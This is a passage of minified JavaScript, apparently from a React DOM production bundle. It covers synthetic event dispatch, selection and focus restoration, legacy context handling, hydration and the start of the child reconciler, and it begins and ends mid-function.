    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t === "input" ? !!Vd[e.type] : t === "textarea"
}
function Ys(e, t, n, r) {
    xs(r),
    t = Or(t, "onChange"),
    0 < t.length && (n = new no("onChange","change",null,n,r),
    e.push({
        event: n,
        listeners: t
    }))
}
var En = null
  , Gn = null;
function Wd(e) {
    qs(e, 0)
}
function ol(e) {
    var t = Mt(e);
    if (fs(t))
        return e
}
function Id(e, t) {
    if (e === "change")
        return t
}
var Us = !1;
if (He) {
    var _l;
    if (He) {
        var Pl = "oninput"in document;
        if (!Pl) {
            var lu = document.createElement("div");
            lu.setAttribute("oninput", "return;"),
            Pl = typeof lu.oninput == "function"
        }
        _l = Pl
    } else
        _l = !1;
    Us = _l && (!document.documentMode || 9 < document.documentMode)
}
function iu() {
    En && (En.detachEvent("onpropertychange", Ds),
    Gn = En = null)
}
function Ds(e) {
    if (e.propertyName === "value" && ol(Gn)) {
        var t = [];
        Ys(t, Gn, e, Ai(e)),
        Ns(Wd, t)
    }
}
function Fd(e, t, n) {
    e === "focusin" ? (iu(),
    En = t,
    Gn = n,
    En.attachEvent("onpropertychange", Ds)) : e === "focusout" && iu()
}
function Gd(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown")
        return ol(Gn)
}
function Md(e, t) {
    if (e === "click")
        return ol(t)
}
function Od(e, t) {
    if (e === "input" || e === "change")
        return ol(t)
}
function Xd(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var Ve = typeof Object.is == "function" ? Object.is : Xd;
function Mn(e, t) {
    if (Ve(e, t))
        return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null)
        return !1;
    var n = Object.keys(e)
      , r = Object.keys(t);
    if (n.length !== r.length)
        return !1;
    for (r = 0; r < n.length; r++) {
        var l = n[r];
        if (!Kl.call(t, l) || !Ve(e[l], t[l]))
            return !1
    }
    return !0
}
function ou(e) {
    for (; e && e.firstChild; )
        e = e.firstChild;
    return e
}
function uu(e, t) {
    var n = ou(e);
    e = 0;
    for (var r; n; ) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length,
            e <= t && r >= t)
                return {
                    node: n,
                    offset: t - e
                };
            e = r
        }
        e: {
            for (; n; ) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = ou(n)
    }
}
function Bs(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? Bs(e, t.parentNode) : "contains"in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}
function Hs() {
    for (var e = window, t = Lr(); t instanceof e.HTMLIFrameElement; ) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n)
            e = t.contentWindow;
        else
            break;
        t = Lr(e.document)
    }
    return t
}
function io(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}
function Yd(e) {
    var t = Hs()
      , n = e.focusedElem
      , r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && Bs(n.ownerDocument.documentElement, n)) {
        if (r !== null && io(n)) {
            if (t = r.start,
            e = r.end,
            e === void 0 && (e = t),
            "selectionStart"in n)
                n.selectionStart = t,
                n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window,
            e.getSelection) {
                e = e.getSelection();
                var l = n.textContent.length
                  , i = Math.min(r.start, l);
                r = r.end === void 0 ? i : Math.min(r.end, l),
                !e.extend && i > r && (l = r,
                r = i,
                i = l),
                l = uu(n, i);
                var o = uu(n, r);
                l && o && (e.rangeCount !== 1 || e.anchorNode !== l.node || e.anchorOffset !== l.offset || e.focusNode !== o.node || e.focusOffset !== o.offset) && (t = t.createRange(),
                t.setStart(l.node, l.offset),
                e.removeAllRanges(),
                i > r ? (e.addRange(t),
                e.extend(o.node, o.offset)) : (t.setEnd(o.node, o.offset),
                e.addRange(t)))
            }
        }
        for (t = [],
        e = n; e = e.parentNode; )
            e.nodeType === 1 && t.push({
                element: e,
                left: e.scrollLeft,
                top: e.scrollTop
            });
        for (typeof n.focus == "function" && n.focus(),
        n = 0; n < t.length; n++)
            e = t[n],
            e.element.scrollLeft = e.left,
            e.element.scrollTop = e.top
    }
}
var Ud = He && "documentMode"in document && 11 >= document.documentMode
  , Ft = null
  , pi = null
  , Zn = null
  , mi = !1;
function su(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    mi || Ft == null || Ft !== Lr(r) || (r = Ft,
    "selectionStart"in r && io(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(),
    r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }),
    Zn && Mn(Zn, r) || (Zn = r,
    r = Or(pi, "onSelect"),
    0 < r.length && (t = new no("onSelect","select",null,t,n),
    e.push({
        event: t,
        listeners: r
    }),
    t.target = Ft)))
}
function cr(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(),
    n["Webkit" + e] = "webkit" + t,
    n["Moz" + e] = "moz" + t,
    n
}
var Gt = {
    animationend: cr("Animation", "AnimationEnd"),
    animationiteration: cr("Animation", "AnimationIteration"),
    animationstart: cr("Animation", "AnimationStart"),
    transitionend: cr("Transition", "TransitionEnd")
}
  , Ll = {}
  , Js = {};
He && (Js = document.createElement("div").style,
"AnimationEvent"in window || (delete Gt.animationend.animation,
delete Gt.animationiteration.animation,
delete Gt.animationstart.animation),
"TransitionEvent"in window || delete Gt.transitionend.transition);
function ul(e) {
    if (Ll[e])
        return Ll[e];
    if (!Gt[e])
        return e;
    var t = Gt[e], n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in Js)
            return Ll[e] = t[n];
    return e
}
var Ks = ul("animationend")
  , Qs = ul("animationiteration")
  , As = ul("animationstart")
  , $s = ul("transitionend")
  , bs = new Map
  , au = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
function mt(e, t) {
    bs.set(e, t),
    _t(t, [e])
}
for (var Vl = 0; Vl < au.length; Vl++) {
    var Wl = au[Vl]
      , Dd = Wl.toLowerCase()
      , Bd = Wl[0].toUpperCase() + Wl.slice(1);
    mt(Dd, "on" + Bd)
}
mt(Ks, "onAnimationEnd");
mt(Qs, "onAnimationIteration");
mt(As, "onAnimationStart");
mt("dblclick", "onDoubleClick");
mt("focusin", "onFocus");
mt("focusout", "onBlur");
mt($s, "onTransitionEnd");
bt("onMouseEnter", ["mouseout", "mouseover"]);
bt("onMouseLeave", ["mouseout", "mouseover"]);
bt("onPointerEnter", ["pointerout", "pointerover"]);
bt("onPointerLeave", ["pointerout", "pointerover"]);
_t("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
_t("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
_t("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
_t("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
_t("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
_t("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var Sn = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
  , Hd = new Set("cancel close invalid load scroll toggle".split(" ").concat(Sn));
function cu(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n,
    Dc(r, t, void 0, e),
    e.currentTarget = null
}
function qs(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n]
          , l = r.event;
        r = r.listeners;
        e: {
            var i = void 0;
            if (t)
                for (var o = r.length - 1; 0 <= o; o--) {
                    var u = r[o]
                      , s = u.instance
                      , d = u.currentTarget;
                    if (u = u.listener,
                    s !== i && l.isPropagationStopped())
                        break e;
                    cu(l, u, d),
                    i = s
                }
            else
                for (o = 0; o < r.length; o++) {
                    if (u = r[o],
                    s = u.instance,
                    d = u.currentTarget,
                    u = u.listener,
                    s !== i && l.isPropagationStopped())
                        break e;
                    cu(l, u, d),
                    i = s
                }
        }
    }
    if (Wr)
        throw e = ai,
        Wr = !1,
        ai = null,
        e
}
function W(e, t) {
    var n = t[xi];
    n === void 0 && (n = t[xi] = new Set);
    var r = e + "__bubble";
    n.has(r) || (ea(t, e, 2, !1),
    n.add(r))
}
function Il(e, t, n) {
    var r = 0;
    t && (r |= 4),
    ea(n, e, r, t)
}
var dr = "_reactListening" + Math.random().toString(36).slice(2);
function On(e) {
    if (!e[dr]) {
        e[dr] = !0,
        us.forEach(function(n) {
            n !== "selectionchange" && (Hd.has(n) || Il(n, !1, e),
            Il(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[dr] || (t[dr] = !0,
        Il("selectionchange", !1, t))
    }
}
function ea(e, t, n, r) {
    switch (Fs(t)) {
    case 1:
        var l = od;
        break;
    case 4:
        l = ud;
        break;
    default:
        l = eo
    }
    n = l.bind(null, t, n, e),
    l = void 0,
    !si || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (l = !0),
    r ? l !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: l
    }) : e.addEventListener(t, n, !0) : l !== void 0 ? e.addEventListener(t, n, {
        passive: l
    }) : e.addEventListener(t, n, !1)
}
function Fl(e, t, n, r, l) {
    var i = r;
    if (!(t & 1) && !(t & 2) && r !== null)
        e: for (; ; ) {
            if (r === null)
                return;
            var o = r.tag;
            if (o === 3 || o === 4) {
                var u = r.stateNode.containerInfo;
                if (u === l || u.nodeType === 8 && u.parentNode === l)
                    break;
                if (o === 4)
                    for (o = r.return; o !== null; ) {
                        var s = o.tag;
                        if ((s === 3 || s === 4) && (s = o.stateNode.containerInfo,
                        s === l || s.nodeType === 8 && s.parentNode === l))
                            return;
                        o = o.return
                    }
                for (; u !== null; ) {
                    if (o = wt(u),
                    o === null)
                        return;
                    if (s = o.tag,
                    s === 5 || s === 6) {
                        r = i = o;
                        continue e
                    }
                    u = u.parentNode
                }
            }
            r = r.return
        }
    Ns(function() {
        var d = i
          , y = Ai(n)
          , h = [];
        e: {
            var m = bs.get(e);
            if (m !== void 0) {
                var x = no
                  , k = e;
                switch (e) {
                case "keypress":
                    if (jr(n) === 0)
                        break e;
                case "keydown":
                case "keyup":
                    x = Sd;
                    break;
                case "focusin":
                    k = "focus",
                    x = Rl;
                    break;
                case "focusout":
                    k = "blur",
                    x = Rl;
                    break;
                case "beforeblur":
                case "afterblur":
                    x = Rl;
                    break;
                case "click":
                    if (n.button === 2)
                        break e;
                case "auxclick":
                case "dblclick":
                case "mousedown":
                case "mousemove":
                case "mouseup":
                case "mouseout":
                case "mouseover":
                case "contextmenu":
                    x = bo;
                    break;
                case "drag":
                case "dragend":
                case "dragenter":
                case "dragexit":
                case "dragleave":
                case "dragover":
                case "dragstart":
                case "drop":
                    x = cd;
                    break;
                case "touchcancel":
                case "touchend":
                case "touchmove":
                case "touchstart":
                    x = jd;
                    break;
                case Ks:
                case Qs:
                case As:
                    x = pd;
                    break;
                case $s:
                    x = Zd;
                    break;
                case "scroll":
                    x = sd;
                    break;
                case "wheel":
                    x = Td;
                    break;
                case "copy":
                case "cut":
                case "paste":
                    x = hd;
                    break;
                case "gotpointercapture":
                case "lostpointercapture":
                case "pointercancel":
                case "pointerdown":
                case "pointermove":
                case "pointerout":
                case "pointerover":
                case "pointerup":
                    x = eu
                }
                var w = (t & 4) !== 0
                  , F = !w && e === "scroll"
                  , f = w ? m !== null ? m + "Capture" : null : m;
                w = [];
                for (var a = d, p; a !== null; ) {
                    p = a;
                    var v = p.stateNode;
                    if (p.tag === 5 && v !== null && (p = v,
                    f !== null && (v = Vn(a, f),
                    v != null && w.push(Xn(a, v, p)))),
                    F)
                        break;
                    a = a.return
                }
                0 < w.length && (m = new x(m,k,null,n,y),
                h.push({
                    event: m,
                    listeners: w
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (m = e === "mouseover" || e === "pointerover",
                x = e === "mouseout" || e === "pointerout",
                m && n !== oi && (k = n.relatedTarget || n.fromElement) && (wt(k) || k[Je]))
                    break e;
                if ((x || m) && (m = y.window === y ? y : (m = y.ownerDocument) ? m.defaultView || m.parentWindow : window,
                x ? (k = n.relatedTarget || n.toElement,
                x = d,
                k = k ? wt(k) : null,
                k !== null && (F = Pt(k),
                k !== F || k.tag !== 5 && k.tag !== 6) && (k = null)) : (x = null,
                k = d),
                x !== k)) {
                    if (w = bo,
                    v = "onMouseLeave",
                    f = "onMouseEnter",
                    a = "mouse",
                    (e === "pointerout" || e === "pointerover") && (w = eu,
                    v = "onPointerLeave",
                    f = "onPointerEnter",
                    a = "pointer"),
                    F = x == null ? m : Mt(x),
                    p = k == null ? m : Mt(k),
                    m = new w(v,a + "leave",x,n,y),
                    m.target = F,
                    m.relatedTarget = p,
                    v = null,
                    wt(y) === d && (w = new w(f,a + "enter",k,n,y),
                    w.target = p,
                    w.relatedTarget = F,
                    v = w),
                    F = v,
                    x && k)
                        t: {
                            for (w = x,
                            f = k,
                            a = 0,
                            p = w; p; p = Lt(p))
                                a++;
                            for (p = 0,
                            v = f; v; v = Lt(v))
                                p++;
                            for (; 0 < a - p; )
                                w = Lt(w),
                                a--;
                            for (; 0 < p - a; )
                                f = Lt(f),
                                p--;
                            for (; a--; ) {
                                if (w === f || f !== null && w === f.alternate)
                                    break t;
                                w = Lt(w),
                                f = Lt(f)
                            }
                            w = null
                        }
                    else
                        w = null;
                    x !== null && du(h, m, x, w, !1),
                    k !== null && F !== null && du(h, F, k, w, !0)
                }
            }
            e: {
                if (m = d ? Mt(d) : window,
                x = m.nodeName && m.nodeName.toLowerCase(),
                x === "select" || x === "input" && m.type === "file")
                    var N = Id;
                else if (ru(m))
                    if (Us)
                        N = Od;
                    else {
                        N = Gd;
                        var j = Fd
                    }
                else
                    (x = m.nodeName) && x.toLowerCase() === "input" && (m.type === "checkbox" || m.type === "radio") && (N = Md);
                if (N && (N = N(e, d))) {
                    Ys(h, N, n, y);
                    break e
                }
                j && j(e, m, d),
                e === "focusout" && (j = m._wrapperState) && j.controlled && m.type === "number" && ti(m, "number", m.value)
            }
            switch (j = d ? Mt(d) : window,
            e) {
            case "focusin":
                (ru(j) || j.contentEditable === "true") && (Ft = j,
                pi = d,
                Zn = null);
                break;
            case "focusout":
                Zn = pi = Ft = null;
                break;
            case "mousedown":
                mi = !0;
                break;
            case "contextmenu":
            case "mouseup":
            case "dragend":
                mi = !1,
                su(h, n, y);
                break;
            case "selectionchange":
                if (Ud)
                    break;
            case "keydown":
            case "keyup":
                su(h, n, y)
            }
            var E;
            if (lo)
                e: {
                    switch (e) {
                    case "compositionstart":
                        var Z = "onCompositionStart";
                        break e;
                    case "compositionend":
                        Z = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        Z = "onCompositionUpdate";
                        break e
                    }
                    Z = void 0
                }
            else
                It ? Os(e, n) && (Z = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (Z = "onCompositionStart");
            Z && (Ms && n.locale !== "ko" && (It || Z !== "onCompositionStart" ? Z === "onCompositionEnd" && It && (E = Gs()) : (nt = y,
            to = "value"in nt ? nt.value : nt.textContent,
            It = !0)),
            j = Or(d, Z),
            0 < j.length && (Z = new qo(Z,e,null,n,y),
            h.push({
                event: Z,
                listeners: j
            }),
            E ? Z.data = E : (E = Xs(n),
            E !== null && (Z.data = E)))),
            (E = _d ? Pd(e, n) : Ld(e, n)) && (d = Or(d, "onBeforeInput"),
            0 < d.length && (y = new qo("onBeforeInput","beforeinput",null,n,y),
            h.push({
                event: y,
                listeners: d
            }),
            y.data = E))
        }
        qs(h, t)
    })
}
function Xn(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}
function Or(e, t) {
    for (var n = t + "Capture", r = []; e !== null; ) {
        var l = e
          , i = l.stateNode;
        l.tag === 5 && i !== null && (l = i,
        i = Vn(e, n),
        i != null && r.unshift(Xn(e, i, l)),
        i = Vn(e, t),
        i != null && r.push(Xn(e, i, l))),
        e = e.return
    }
    return r
}
function Lt(e) {
    if (e === null)
        return null;
    do
        e = e.return;
    while (e && e.tag !== 5);
    return e || null
}
function du(e, t, n, r, l) {
    for (var i = t._reactName, o = []; n !== null && n !== r; ) {
        var u = n
          , s = u.alternate
          , d = u.stateNode;
        if (s !== null && s === r)
            break;
        u.tag === 5 && d !== null && (u = d,
        l ? (s = Vn(n, i),
        s != null && o.unshift(Xn(n, s, u))) : l || (s = Vn(n, i),
        s != null && o.push(Xn(n, s, u)))),
        n = n.return
    }
    o.length !== 0 && e.push({
        event: t,
        listeners: o
    })
}
var Jd = /\r\n?/g
  , Kd = /\u0000|\uFFFD/g;
function fu(e) {
    return (typeof e == "string" ? e : "" + e).replace(Jd, `
`).replace(Kd, "")
}
function fr(e, t, n) {
    if (t = fu(t),
    fu(e) !== t && n)
        throw Error(g(425))
}
function Xr() {}
var hi = null
  , yi = null;
function vi(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var gi = typeof setTimeout == "function" ? setTimeout : void 0
  , Qd = typeof clearTimeout == "function" ? clearTimeout : void 0
  , pu = typeof Promise == "function" ? Promise : void 0
  , Ad = typeof queueMicrotask == "function" ? queueMicrotask : typeof pu < "u" ? function(e) {
    return pu.resolve(null).then(e).catch($d)
}
: gi;
function $d(e) {
    setTimeout(function() {
        throw e
    })
}
function Gl(e, t) {
    var n = t
      , r = 0;
    do {
        var l = n.nextSibling;
        if (e.removeChild(n),
        l && l.nodeType === 8)
            if (n = l.data,
            n === "/$") {
                if (r === 0) {
                    e.removeChild(l),
                    Fn(t);
                    return
                }
                r--
            } else
                n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = l
    } while (n);
    Fn(t)
}
function ut(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3)
            break;
        if (t === 8) {
            if (t = e.data,
            t === "$" || t === "$!" || t === "$?")
                break;
            if (t === "/$")
                return null
        }
    }
    return e
}
function mu(e) {
    e = e.previousSibling;
    for (var t = 0; e; ) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0)
                    return e;
                t--
            } else
                n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var sn = Math.random().toString(36).slice(2)
  , Fe = "__reactFiber$" + sn
  , Yn = "__reactProps$" + sn
  , Je = "__reactContainer$" + sn
  , xi = "__reactEvents$" + sn
  , bd = "__reactListeners$" + sn
  , qd = "__reactHandles$" + sn;
function wt(e) {
    var t = e[Fe];
    if (t)
        return t;
    for (var n = e.parentNode; n; ) {
        if (t = n[Je] || n[Fe]) {
            if (n = t.alternate,
            t.child !== null || n !== null && n.child !== null)
                for (e = mu(e); e !== null; ) {
                    if (n = e[Fe])
                        return n;
                    e = mu(e)
                }
            return t
        }
        e = n,
        n = e.parentNode
    }
    return null
}
function bn(e) {
    return e = e[Fe] || e[Je],
    !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}
function Mt(e) {
    if (e.tag === 5 || e.tag === 6)
        return e.stateNode;
    throw Error(g(33))
}
function sl(e) {
    return e[Yn] || null
}
var ki = []
  , Ot = -1;
function ht(e) {
    return {
        current: e
    }
}
function I(e) {
    0 > Ot || (e.current = ki[Ot],
    ki[Ot] = null,
    Ot--)
}
function V(e, t) {
    Ot++,
    ki[Ot] = e.current,
    e.current = t
}
var pt = {}
  , le = ht(pt)
  , de = ht(!1)
  , Et = pt;
function qt(e, t) {
    var n = e.type.contextTypes;
    if (!n)
        return pt;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t)
        return r.__reactInternalMemoizedMaskedChildContext;
    var l = {}, i;
    for (i in n)
        l[i] = t[i];
    return r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = t,
    e.__reactInternalMemoizedMaskedChildContext = l),
    l
}
function fe(e) {
    return e = e.childContextTypes,
    e != null
}
function Yr() {
    I(de),
    I(le)
}
function hu(e, t, n) {
    if (le.current !== pt)
        throw Error(g(168));
    V(le, t),
    V(de, n)
}
function ta(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes,
    typeof r.getChildContext != "function")
        return n;
    r = r.getChildContext();
    for (var l in r)
        if (!(l in t))
            throw Error(g(108, Fc(e) || "Unknown", l));
    return X({}, n, r)
}
function Ur(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || pt,
    Et = le.current,
    V(le, e),
    V(de, de.current),
    !0
}
function yu(e, t, n) {
    var r = e.stateNode;
    if (!r)
        throw Error(g(169));
    n ? (e = ta(e, t, Et),
    r.__reactInternalMemoizedMergedChildContext = e,
    I(de),
    I(le),
    V(le, e)) : I(de),
    V(de, n)
}
var Ye = null
  , al = !1
  , Ml = !1;
function na(e) {
    Ye === null ? Ye = [e] : Ye.push(e)
}
function ef(e) {
    al = !0,
    na(e)
}
function yt() {
    if (!Ml && Ye !== null) {
        Ml = !0;
        var e = 0
          , t = L;
        try {
            var n = Ye;
            for (L = 1; e < n.length; e++) {
                var r = n[e];
                do
                    r = r(!0);
                while (r !== null)
            }
            Ye = null,
            al = !1
        } catch (l) {
            throw Ye !== null && (Ye = Ye.slice(e + 1)),
            Zs($i, yt),
            l
        } finally {
            L = t,
            Ml = !1
        }
    }
    return null
}
var Xt = []
  , Yt = 0
  , Dr = null
  , Br = 0
  , we = []
  , Se = 0
  , Zt = null
  , Ue = 1
  , De = "";
function xt(e, t) {
    Xt[Yt++] = Br,
    Xt[Yt++] = Dr,
    Dr = e,
    Br = t
}
function ra(e, t, n) {
    we[Se++] = Ue,
    we[Se++] = De,
    we[Se++] = Zt,
    Zt = e;
    var r = Ue;
    e = De;
    var l = 32 - Pe(r) - 1;
    r &= ~(1 << l),
    n += 1;
    var i = 32 - Pe(t) + l;
    if (30 < i) {
        var o = l - l % 5;
        i = (r & (1 << o) - 1).toString(32),
        r >>= o,
        l -= o,
        Ue = 1 << 32 - Pe(t) + l | n << l | r,
        De = i + e
    } else
        Ue = 1 << i | n << l | r,
        De = e
}
function oo(e) {
    e.return !== null && (xt(e, 1),
    ra(e, 1, 0))
}
function uo(e) {
    for (; e === Dr; )
        Dr = Xt[--Yt],
        Xt[Yt] = null,
        Br = Xt[--Yt],
        Xt[Yt] = null;
    for (; e === Zt; )
        Zt = we[--Se],
        we[Se] = null,
        De = we[--Se],
        we[Se] = null,
        Ue = we[--Se],
        we[Se] = null
}
var ye = null
  , he = null
  , G = !1
  , _e = null;
function la(e, t) {
    var n = Ne(5, null, null, 0);
    n.elementType = "DELETED",
    n.stateNode = t,
    n.return = e,
    t = e.deletions,
    t === null ? (e.deletions = [n],
    e.flags |= 16) : t.push(n)
}
function vu(e, t) {
    switch (e.tag) {
    case 5:
        var n = e.type;
        return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t,
        t !== null ? (e.stateNode = t,
        ye = e,
        he = ut(t.firstChild),
        !0) : !1;
    case 6:
        return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t,
        t !== null ? (e.stateNode = t,
        ye = e,
        he = null,
        !0) : !1;
    case 13:
        return t = t.nodeType !== 8 ? null : t,
        t !== null ? (n = Zt !== null ? {
            id: Ue,
            overflow: De
        } : null,
        e.memoizedState = {
            dehydrated: t,
            treeContext: n,
            retryLane: 1073741824
        },
        n = Ne(18, null, null, 0),
        n.stateNode = t,
        n.return = e,
        e.child = n,
        ye = e,
        he = null,
        !0) : !1;
    default:
        return !1
    }
}
function wi(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}
function Si(e) {
    if (G) {
        var t = he;
        if (t) {
            var n = t;
            if (!vu(e, t)) {
                if (wi(e))
                    throw Error(g(418));
                t = ut(n.nextSibling);
                var r = ye;
                t && vu(e, t) ? la(r, n) : (e.flags = e.flags & -4097 | 2,
                G = !1,
                ye = e)
            }
        } else {
            if (wi(e))
                throw Error(g(418));
            e.flags = e.flags & -4097 | 2,
            G = !1,
            ye = e
        }
    }
}
function gu(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13; )
        e = e.return;
    ye = e
}
function pr(e) {
    if (e !== ye)
        return !1;
    if (!G)
        return gu(e),
        G = !0,
        !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type,
    t = t !== "head" && t !== "body" && !vi(e.type, e.memoizedProps)),
    t && (t = he)) {
        if (wi(e))
            throw ia(),
            Error(g(418));
        for (; t; )
            la(e, t),
            t = ut(t.nextSibling)
    }
    if (gu(e),
    e.tag === 13) {
        if (e = e.memoizedState,
        e = e !== null ? e.dehydrated : null,
        !e)
            throw Error(g(317));
        e: {
            for (e = e.nextSibling,
            t = 0; e; ) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            he = ut(e.nextSibling);
                            break e
                        }
                        t--
                    } else
                        n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            he = null
        }
    } else
        he = ye ? ut(e.stateNode.nextSibling) : null;
    return !0
}
function ia() {
    for (var e = he; e; )
        e = ut(e.nextSibling)
}
function en() {
    he = ye = null,
    G = !1
}
function so(e) {
    _e === null ? _e = [e] : _e.push(e)
}
var tf = Ae.ReactCurrentBatchConfig;
function yn(e, t, n) {
    if (e = n.ref,
    e !== null && typeof e != "function" && typeof e != "object") {
        if (n._owner) {
            if (n = n._owner,
            n) {
                if (n.tag !== 1)
                    throw Error(g(309));
                var r = n.stateNode
            }
            if (!r)
                throw Error(g(147, e));
            var l = r
              , i = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === i ? t.ref : (t = function(o) {
                var u = l.refs;
                o === null ? delete u[i] : u[i] = o
            }
            ,
            t._stringRef = i,
            t)
        }
        if (typeof e != "string")
            throw Error(g(284));
        if (!n._owner)
            throw Error(g(290, e))
    }
    return e
}
function mr(e, t) {
    throw e = Object.prototype.toString.call(t),
    Error(g(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}
function xu(e) {
    var t = e._init;
    return t(e._payload)
}
function oa(e) {
    function t(f, a) {
        if (e) {
            var p = f.deletions;
            p === null ? (f.deletions = [a],
            f.flags |= 16) : p.push(a)
        }
    }
    function n(f, a) {
        if (!e)
            return null;
        for (; a !== null; )
            t(f, a),
            a = a.sibling;
        return null
    }
    function r(f, a) {
        for (f = new Map; a !== null; )
            a.key !== null ? f.set(a.key, a) : f.set(a.index, a),
            a = a.sibling;
        return f
    }
    function l(f, a) {
        return f = dt(f, a),
        f.index = 0,
        f.sibling = null,
        f
    }
    function i(f, a, p) {
        return f.index = p,
        e ? (p = f.alternate,
        p !== null ? (p = p.index,
        p < a ? (f.flags |= 2,
        a) : p) : (f.flags |= 2,
        a)) : (f.flags |= 1048576,
        a)
    }
    function o(f) {
        return e && f.alternate === null && (f.flags |= 2),
        f
    }
    function u(f, a, p, v) {
        return a === null || a.tag !== 6 ? (a = Hl(p, f.mode, v),
        a.return = f,
        a) : (a = l(a, p),
        a.return = f,
        a)
    }
    function s(f, a, p, v) {
        var N = p.type;
        return N === Wt ? y(f, a, p.props.children, v, p.key) : a !== null && (a.elementType === N || typeof N == "object" && N !== null && N.$$typeof === be && xu(N) === a.type) ? (v = l(a, p.props),
        v.ref = yn(f, a, p),
        v.return = f,
        v) : (v = Pr(p.type, p.key, p.props, null, f.mode, v),
        v.ref = yn(f, a, p),
        v.return = f,
        v)
    }
    function d(f, a, p, v) {
        return a === null || a.tag !== 4 || a.stateNode.containerInfo !== p.containerInfo || a.stateNode.implementation !== p.implementation ? (a = Jl(p, f.mode, v),
        a.return = f,
        a) : (a = l(a, p.children || []),
        a.return = f,
        a)
    }
    function y(f, a, p, v, N) {
        return a === null || a.tag !== 7 ? (a = jt(p, f.mode, v, N),
        a.return = f,
        a) : (a = l(a, p),
        a.return = f,
        a)
    }
    function h(f, a, p) {
        if (typeof a == "string" && a !== "" || typeof a == "number")
            return a = Hl("" + a, f.mode, p),
            a.return = f,
            a;
        if (typeof a == "object" && a !== null) {
            switch (a.$$typeof) {
            case rr:
                return p = Pr(a.type, a.key, a.props, null, f.mode, p),
                p.ref = yn(f, null, a),
                p.return = f,
                p;
            case Vt:
                return a = Jl(a, f.mode, p),
                a.return = f,
                a;
            case be:
                var v = a._init;
                return h(f, v(a._payload), p)
            }
            if (kn(a) || dn(a))
                return a = jt(a, f.mode, p, null),
                a.return = f,
                a;
            mr(f, a)
        }
        return null
